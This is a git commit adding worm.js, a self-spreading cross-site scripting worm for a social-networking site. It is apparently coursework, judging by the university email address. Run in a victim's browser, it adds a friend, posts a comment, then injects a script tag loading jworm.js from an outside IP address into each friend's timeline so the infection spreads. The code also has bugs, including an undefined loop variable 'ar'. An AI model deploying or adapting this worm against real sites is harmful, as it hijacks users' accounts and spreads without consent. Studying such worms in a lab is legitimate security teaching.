551bb1acb4cfc5eb705f0d2016725a9fda551db4
Andrew Quan <ajq2679@rit.edu>
2021-12-16 14:20:12 -0500

    Add files via upload

---
+++ worm.js
@@ -0,0 +1,40 @@
+var friends_list;
+$(document).ready(function () {
+    var starting_id = 134;
+    $.ajax({
+        url: "/add_friend.php?id=" + starting_id, success: function (result) {
+            console.log(result)
+            if (result == "True - Friend Added Successfully") {
+                var d = new Date();
+                var date;
+                date += d.getMonth() + 1 + "/" + d.getDate() + "/" + d.getFullYear() + " " + d.getHours() + ":" + d.getMinutes();
+                comment = "<img src=https://i.ebayimg.com/images/g/k6wAAOSw-s5eTqEZ/s-l500.jpg>Just became friends at: " + date;
+                $.ajax({
+                    url: "/add_comment.php?id=" + starting_id + "&comment=" + comment, success: function (result) {
+                        console.log(result);
+                    }
+                });
+                $.ajax({
+                    // Get friends in friends list and infect
+                    url: "/friends.php", success: function (result) {
+                        console.log(result);
+                        friends_list = result.split("<BR>")[0].split(",")
+                        for (var i = 0; i < ar.length; i++) {
+                            console.log(friends_list[i]);
+                            (function (new_id) {
+                                $.ajax({
+                                    url: "/timeline.php?id=" + new_id, success: function (result) {
+                                        if (result.indexOf("54.158.180.71") === -1) {
+                                            var worm = "<script src=\"http://54.158.180.71/jworm.js\"></script>"
+                                            $.ajax({ url: "/add_comment.php?id=" + new_id + "&comment=" + worm, success: function (result) { console.log(result); } });
+                                        }
+                                    }
+                                });
+                            })(ar[i]);
+                        }
+                    }
+                })
+            }
+        }
+    })
+})
